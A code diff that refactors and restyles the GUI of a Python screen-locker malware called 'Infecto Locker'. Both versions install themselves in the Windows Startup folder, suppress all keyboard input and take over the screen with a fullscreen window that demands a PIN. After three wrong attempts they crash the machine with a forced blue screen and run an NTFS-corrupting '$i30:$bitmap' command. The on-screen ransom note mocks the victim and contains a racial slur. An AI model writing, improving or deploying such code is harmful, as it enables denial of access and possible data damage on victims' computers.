@@ -1,128 +1,134 @@
-
-import tkinter
-import time
-import os
-import keyboard
-import sys
-import getpass
-import os
-import keyboard
+import tkinter as tk
+from tkinter import ttk
 import ctypes
 import subprocess
+import os
+import sys
+import getpass
+import keyboard
 import ctypes.wintypes
 from tkinter import messagebox
 from functools import partial
-from tkinter import *
 
 def bsod():
-	subprocess.call("cd C:\:$i30:$bitmap",shell=True)
-	ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
-	ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
-
+    subprocess.call("cd C:\\:$i30:$bitmap", shell=True)
+    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
 
 def startup(path):
-	USER_NAME = getpass.getuser()
-	global bat_path
-	bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
-	
-	with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
-		bat_file.write(r'start "" %s' % path)
+    USER_NAME = getpass.getuser()
+    global bat_path
+    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+    
+    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
+        bat_file.write(r'start "" %s' % path)
 
 def uninstall(wind):
-	wind.destroy()
-	os.remove(bat_path + '\\' + "open.bat")
-	keyboard.unhook_all()
+    wind.destroy()
+    os.remove(bat_path + '\\' + "open.bat")
+    keyboard.unhook_all()
 
-wind = Tk()
+wind = tk.Tk()
 password = "12345"
-lock_text = "Oops get fucked nigga you have 3 attempts to unlock after that\nyour system goes boom :)"
+lock_text = "Oops! You have 3 attempts to unlock. After that, your system goes boom :)"
 count = 3
 
 file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])
-
 startup(file_path)
 
 def buton(arg):
-	enter_pass.insert(END, arg)
+    enter_pass.insert(tk.END, arg)
+
 def delbuton():
-	enter_pass.delete(-1, END)
+    enter_pass.delete(len(enter_pass.get())-1, tk.END)
 
 def tapp(key):
-	pass
+    pass
 
 def check():
-	global count
-	if enter_pass.get() == password:
-		messagebox.showinfo("ScreenLocker","UNLOCKED SUCCESSFULLY")
-
-		uninstall(wind)
-	else:
-		count -= 1
-		if count == 0:
-			messagebox.showwarning("ScreenLocker","number of attempts expired")
-			bsod()
-		else:
-			
-			messagebox.showwarning("ScreenLocker","Wrong password. Avalible tries: "+ str(count))
+    global count
+    if enter_pass.get() == password:
+        messagebox.showinfo("ScreenLocker", "UNLOCKED SUCCESSFULLY")
+        uninstall(wind)
+    else:
+        count -= 1
+        if count == 0:
+            messagebox.showwarning("ScreenLocker", "Number of attempts expired")
+            bsod()
+        else:
+            messagebox.showwarning("ScreenLocker", "Wrong password. Available tries: " + str(count))
 
 def exiting():
-	messagebox.showwarning("ScreenLocker","DEATH IS INEVITABLE")
+    messagebox.showwarning("ScreenLocker", "DEATH IS INEVITABLE")
+    wind.destroy()
+
 wind.title("Infecto Locker")
-wind["bg"] = "black"
-UNTEXD = Label(wind,bg="black", fg="#424549", padx=10, pady=10, text="\nFucked By Infecto\n\n\n", font="helvetica 40").pack()
-untex = Label(wind,bg="black", fg="#424549",text=lock_text, font="helvetica 40")
-untex.place(x=210, y=170)
-heading = 'Announcement'
-announcement = Label(wind, bg='black', fg='#424549', font='helvetica 25 bold', text=heading).place(x=50, y=290)
+wind.configure(bg="#2C3E50")
 
-note = '''hi, my name is lust and im so sorry for who ever
-has sent you this because you aint getting anything 
-back because i said so\ni guess this will teach you to\nNOT DOWNLOAD RANDOM FUCKING FILES OF THE INTERNET'''
-T =Text(wind, height=7, width=35, fg='#424549',bd=0, exportselection=0, bg='black', font='helvetica 19')
-T.place(x=50, y=340)
-T.insert(INSERT, note)
+# Modern font and color styles
+font_large = ("Helvetica", 20, "bold")
+font_medium = ("Helvetica", 16)
+font_small = ("Helvetica", 12)
 
-procedure = 'How to unlock your computer'
-procedure = Label(wind, bg='black', fg='#424549', font='helvetica 25 bold', text=procedure).place(x=50, y=530)
-steps = '''1. Take your black ass off the net
-2. Stop opening random files 
-3. aint nobody giving you your password to unlock this pc'''
-T1 =Text(wind, height=5, width=30, fg='#424549',bd=0, exportselection=0, bg='black', font='helvetica 19')
-T1.place(x=50, y=580)
-T1.insert(INSERT, steps)
+# Header and warning text
+header = tk.Label(wind, text="Fucked By Infecto", bg="#2C3E50", fg="#ECF0F1", font=font_large)
+header.pack(pady=20)
 
-keyboard.on_press(tapp, suppress=True)
+lock_message = tk.Label(wind, text=lock_text, bg="#2C3E50", fg="#ECF0F1", font=font_medium, wraplength=600)
+lock_message.pack(pady=10)
 
-vertical = Frame(wind, bg='#424549', height=490, width=2)
-vertical.pack()#place(x=520, y=310)
+note = '''Hi, my name is Lust and I'm sorry for whoever has sent you this because you ain't getting anything back because I said so.
+I guess this will teach you to NOT DOWNLOAD RANDOM FILES OFF THE INTERNET'''
+note_label = tk.Label(wind, text="Note:", bg="#2C3E50", fg="#ECF0F1", font=font_medium)
+note_label.pack(pady=5)
+note_text = tk.Text(wind, height=6, width=60, bg="#34495E", fg="#ECF0F1", font=font_small, wrap=tk.WORD, bd=0)
+note_text.insert(tk.INSERT, note)
+note_text.pack(pady=5)
+note_text.config(state=tk.DISABLED)
 
+steps_text = '''1. Take your black ass off the net
+2. Stop opening random files
+3. Nobody is giving you your password to unlock this PC'''
+steps_label = tk.Label(wind, text="How to unlock your computer:", bg="#2C3E50", fg="#ECF0F1", font=font_medium)
+steps_label.pack(pady=5)
+steps_text_widget = tk.Text(wind, height=5, width=60, bg="#34495E", fg="#ECF0F1", font=font_small, wrap=tk.WORD, bd=0)
+steps_text_widget.insert(tk.INSERT, steps_text)
+steps_text_widget.pack(pady=5)
+steps_text_widget.config(state=tk.DISABLED)
 
-enter_pass = Entry(wind,bg="black", bd=30, fg="#424549", text="",show='•', font="helvetica 35", width=11, insertwidth=4, justify = "center")
-enter_pass.place(x=715, y=290)     #pack
-wind.resizable(0,0)
+# Creating a frame for the keypad
+keypad_frame = tk.Frame(wind, bg="#2C3E50")
+keypad_frame.pack(pady=20)
 
+button_style = {"bg": "#34495E", "fg": "#ECF0F1", "font": font_medium, "bd": 0, "width": 5, "height": 2}
 
-wind.lift()
-wind.attributes('-topmost',True)
+# Creating number buttons
+buttons = [
+    ("1", 0, 0), ("2", 1, 0), ("3", 2, 0),
+    ("4", 0, 1), ("5", 1, 1), ("6", 2, 1),
+    ("7", 0, 2), ("8", 1, 2), ("9", 2, 2),
+    ("0", 1, 3), ("Delete", 0, 3), ("Unlock", 2, 3)
+]
 
-wind.after_idle(wind.attributes,'-topmost',True)
+for (text, col, row) in buttons:
+    if text == "Delete":
+        button = tk.Button(keypad_frame, text=text, **button_style, command=delbuton)
+    elif text == "Unlock":
+        button = tk.Button(keypad_frame, text=text, **button_style, command=check)
+    else:
+        button = tk.Button(keypad_frame, text=text, **button_style, command=partial(buton, text))
+    button.grid(row=row, column=col, padx=5, pady=5)
+
+# Entry field for password
+enter_pass = tk.Entry(wind, bg="#34495E", fg="#ECF0F1", show='•', font=font_large, justify="center", bd=0, insertwidth=2)
+enter_pass.pack(pady=20)
+
+wind.geometry("800x600")
+wind.resizable(False, False)
+wind.attributes('-topmost', True)
 wind.attributes('-fullscreen', True)
 wind.protocol("WM_DELETE_WINDOW", exiting)
 
-left_value = 20
-moving_value = 80
-
-button1 = Button(wind,text="1", bg='#424549', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "1")).place(x=640 + moving_value, y=450)
-button2 = Button(wind,text="2", bg='#424549', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "2")).place(x=790 + 50, y=450)
-button3 = Button(wind,text="3", bg='#424549', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "3")).place(x=940 + left_value, y=450)
-button4 = Button(wind,text="4", bg='#424549', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "4")).place(x=640 + moving_value, y=540)
-button5 = Button(wind,text="5", bg='#424549', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "5")).place(x=790 + 50, y=540)
-button6 = Button(wind,text="6", bg='#424549', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "6")).place(x=940 + left_value, y=540)
-button7 = Button(wind,text="7", bg='#424549', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "7")).place(x=760 + moving_value, y=630)
-button8 = Button(wind,text="8", bg='#424549', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "8")).place(x=670 + 50, y=630)
-button9 = Button(wind,text="9", bg='#424549', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "9")).place(x=940 + left_value, y=630)
-button0 = Button(wind,text="0", bg='#424549', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "0")).place(x=790 + 50, y=720)
-delbutton = Button(wind,text="Delete", bg='#424549', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=delbuton).place(x=640 + moving_value, y=720)
-button = Button(wind,text="Unlock", bg='#424549', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=check).place(x=940 + left_value, y=720)
+keyboard.on_press(tapp, suppress=True)
 
 wind.mainloop()
